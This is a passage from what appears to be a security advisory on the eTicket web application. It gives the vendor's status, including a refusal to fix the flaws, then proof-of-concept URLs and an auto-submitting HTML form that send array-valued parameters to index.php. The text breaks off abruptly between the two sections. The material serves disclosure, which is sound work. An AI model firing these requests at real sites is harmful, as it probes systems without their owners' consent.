Vendor Status:
HM 2K from eTicket got the Draft advisory on 21 May 2007 and got extensive support in \
how to fix the security problems on 23 May 2007 and 28 May 2007. In HM 2K's own words \
HM 2K "lost interest" and HM 2K "seriously found it too difficult to orchestrate what \
you [netVigilance] were asking from me [HM 2K], so I just did what I thought was \
best.". netVigilance's tests show that version 1.5.5.1 is also vulnerable. There \

Off.

http://[TARGET]/[PRODUCT FOLDER]/index.php?name[]=1
OR
http://[TARGET]/[PRODUCT FOLDER]/index.php?email[]=1
OR
http://[TARGET]/[PRODUCT FOLDER]/index.php?phone[]=1
OR
http://[TARGET]/[PRODUCT FOLDER]/index.php?subject[]=1
OR (available for version 1.5.5 and also for new version 1.5.5.1)
Make file (example.html) with the next content:
"
<html>
<body onLoad="document.forms(0).submit();">
<form action="http://[TARGET]/[PRODUCT FOLDER]/index.php" method="POST">
<input type="hidden" name="name[]" value="1">
<input type="hidden" name="email[]" value="1">
<input type="hidden" name="phone[]" value="1">
<input type="hidden" name="subject[]" value="1">
</form>
</body>
</html>
"
Then load it in any web browser.
